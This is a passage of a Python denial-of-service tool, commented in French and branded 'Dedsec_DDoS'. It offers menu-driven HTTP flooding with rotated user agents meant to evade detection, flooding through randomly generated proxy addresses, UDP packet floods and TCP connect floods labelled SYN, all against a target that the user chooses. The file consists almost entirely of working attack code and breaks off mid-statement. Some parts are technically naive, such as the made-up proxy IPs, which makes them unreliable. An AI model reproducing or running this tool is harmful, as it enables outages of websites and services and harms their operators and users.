
import os
import sys
import time
import socket
import threading
import random
import urllib.request
import ssl
import queue
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore
from pyfiglet import Figlet
from urllib.request import ProxyHandler, build_opener
from itertools import cycle

# Initialiser les couleurs
init(autoreset=True)
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]

# Animation ASCII
def animate_ascii(text, duration=3):
    start_time = time.time()
    while time.time() - start_time < duration:
        for color in colors:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(color + text)
            time.sleep(0.1)

ascii_text = Figlet(font='slant').renderText('Dedsec_DDoS')
animate_ascii(ascii_text)

F = Fore.GREEN
Z = Fore.RED
S = Fore.YELLOW
C = Fore.CYAN

# Liste de user-agents réels pour éviter la détection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Générateur de user-agent aléatoire
def get_random_user_agent():
    return random.choice(USER_AGENTS)

# Mode 1: Attaque HTTP classique
def attack_http(url, stop_event):
    while not stop_event.is_set():
        headers = {'User-Agent': get_random_user_agent()}
        try:
            req = urllib.request.urlopen(urllib.request.Request(url, headers=headers), timeout=5)
            if req.status == 200:
                print(f'{F}[HTTP] Attack OK: {url}')
            else:
                print(f'{Z}[HTTP] Fail: {url} - Status: {req.status}')
        except urllib.error.HTTPError as e:
            print(f'{Z}[HTTP] HTTP Error: {url} - Code: {e.code}')
        except urllib.error.URLError as e:
            print(f'{S}[HTTP] DOWN: {url} - Reason: {e.reason}')
        except Exception as e:
            print(f'{S}[HTTP] Error: {url} - {str(e)}')
        time.sleep(random.uniform(0.1, 0.5))

# Mode 2: Attaque via Proxy
def attack_proxy(url, stop_event):
    while not stop_event.is_set():
        # Génération d'une IP proxy aléatoire
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        port = random.choice([8080, 8888, 3128, 8000])
        proxy = f"{ip}:{port}"
        
        headers = {'User-Agent': get_random_user_agent()}
        try:
            proxy_handler = ProxyHandler({'http': f'http://{proxy}', 'https': f'http://{proxy}'})
            opener = build_opener(proxy_handler)
            req = opener.open(urllib.request.Request(url, headers=headers), timeout=5)
            if req.status == 200:
                print(f'{F}[PROXY] OK: {url} | Proxy: {proxy}')
            else:
                print(f'{Z}[PROXY] Fail: {url} | Proxy: {proxy} - Status: {req.status}')
        except Exception as e:
            print(f'{S}[PROXY] Error: {url} | Proxy: {proxy} - {str(e)}')
        time.sleep(random.uniform(0.1, 0.5))

# Mode 3: Attaque UDP
def attack_udp(ip, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while not stop_event.is_set():
        try:
            # Génération de données aléatoires de différentes tailles
            packet_size = random.randint(64, 1024)
            bytes_data = random._urandom(packet_size)
            sock.sendto(bytes_data, (ip, port))
            print(f'{F}[UDP] Frappe sur {ip}:{port} - Size: {packet_size} bytes')
            time.sleep(random.uniform(0.01, 0.1))
        except Exception as e:
            print(f'{Z}[UDP] Error: {ip}:{port} - {str(e)}')
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except:
                pass
    sock.close()

# Mode 4: Attaque SYN
def attack_syn(ip, port, stop_event):
    while not stop_event.is_set():
        try:
            # Création d'un socket TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            
            # Simulation d'une connexion SYN (sans envoyer ACK)
            result = s.connect_ex((ip, port))
            if result == 0:
                print(f'{F}[SYN] Frappe sur {ip}:{port}')
            else:
                print(f'{Z}[SYN] Fail: {ip}:{port} - Code: {result}')
            
            # Fermeture immédiate pour simuler une attaque SYN
            s.close()
            
            # Délai aléatoire
            time.sleep(random.uniform(0.01, 0.05))
        except Exception as e:
            print(f'{Z}[SYN] Error: {ip}:{port} - {str(e)}')

# Menu principal
def main_menu():
    print(f"""{Fore.CYAN}
+----------------------------------------+
|           BY:Mr_Chrxs - MENU           |
+----------------------------------------+
|             [1] Attaque HTTP           |
|             [2] Attaque Proxy          |
|             [3] Attaque UDP            |
|             [4] Attaque SYN            |
+----------------------------------------+
""")
    choice = input("Choix (1/2/3/4): ")

    if choice in ['1', '2']:
        url = input("Cible URL (ex: http://example.com): ")
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        threads = int(input("Nombre de threads: "))
        duration = int(input("Durée de l'attaque (secondes, 0 pour infini): "))
        
        # Créer un événement pour arrêter les threads
        stop_event = threading.Event()
        
        # Démarrer les threads d'attaque
        attack_threads = []
        for _ in range(threads):
            if choice == '1':
                t = threading.Thread(target=attack_http, args=(url, stop_event))
            else:
                t = threading.Thread(target=attack_proxy, args=(url, stop_event))
            t.daemon = True
            t.start()
            attack_threads.append(t)
        
        # Arrêter l'attaque après la durée spécifiée
        if duration > 0:
            time.sleep(duration)
            stop_event.set()
            print(f"{Fore.YELLOW}Attaque terminée après {duration} secondes.")
        else:
            print(f"{Fore.YELLOW}Attaque en cours (infinie). Appuyez sur Ctrl+C pour arrêter.")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                stop_event.set()
                print(f"{Fore.YELLOW}Attaque arrêtée par l'utilisateur.")
        
    elif choice in ['3', '4']:
        ip = input("Adresse IP cible : ")
        port = int(input("Port (ex: 80, 443) : "))
        threads = int(input("Nombre de threads: "))
        duration = int(input("Durée de l'attaque (secondes, 0 pour infini): "))
        
        # Créer un événement pour arrêter les threads
        stop_event = threading.Event()
        
        # Démarrer les threads d'attaque
        attack_threads = []
        for _ in range(threads):
            if choice == '3':
                t = threading.Thread(target=attack_udp, args=(ip, port, stop_event))
            else:
                t = threading.Thread(target=attack_syn, args=(ip, port, stop_event))
            t.da
